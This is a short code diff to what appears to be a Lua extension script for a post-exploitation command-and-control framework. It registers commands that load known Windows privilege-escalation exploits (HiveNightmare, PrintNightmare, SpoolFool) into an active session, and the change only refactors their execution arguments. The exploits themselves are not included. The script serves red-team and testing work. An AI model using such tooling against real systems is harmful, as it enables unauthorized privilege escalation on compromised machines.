@@ -72,7 +72,7 @@ local function run_SharpHiveNightmare_Net45()
     local session = active()
     local sharphivenightmare_path = "Elevate/SharpHiveNightmare_Net4.5.exe"
     return execute_assembly(session, script_resource(sharphivenightmare_path),
-                            {}, true, false, false)
+                            {}, true, new_sac())
 end
 command("elevate:SharpHiveNightmare_Net4.5", run_SharpHiveNightmare_Net45,
         "SharpHiveNightmare_Net45", "T1068")
@@ -83,7 +83,7 @@ local function run_SharpPrintNightmare_Net40(args)
     local session = active()
     local sharpprintnightmare_path = "Elevate/SharpPrintNightmare_Net4.0.exe"
     return execute_assembly(session, script_resource(sharpprintnightmare_path),
-                            args, true, false, false)
+                            args, true, new_sac())
 end
 command("elevate:SharpPrintNightmare_Net4.0", run_SharpPrintNightmare_Net40,
         "SharpPrintNightmare_Net40", "T1068")
@@ -94,7 +94,7 @@ local function run_SharpPrintNightmare_Net45()
     local session = active()
     local sharpprintnightmare_path = "Elevate/SharpPrintNightmare_Net4.5.exe"
     return execute_assembly(session, script_resource(sharpprintnightmare_path),
-                            {}, true, false, false)
+                            {}, true, new_sac())
 end
 command("elevate:SharpPrintNightmare_Net4.5", run_SharpPrintNightmare_Net45,
         "SharpPrintNightmare_Net45", "T1068")
@@ -105,7 +105,7 @@ local function run_SpoolFool_Net40()
     local session = active()
     local spoolfool_path = "Elevate/SpoolFool_Net4.exe"
     return execute_assembly(session, script_resource(spoolfool_path), {}, true,
-                            false, false)
+                            new_sac())
 end
 command("elevate:SpoolFool_Net4.0", run_SpoolFool_Net40, "SpoolFool_Net40",
         "T1068")
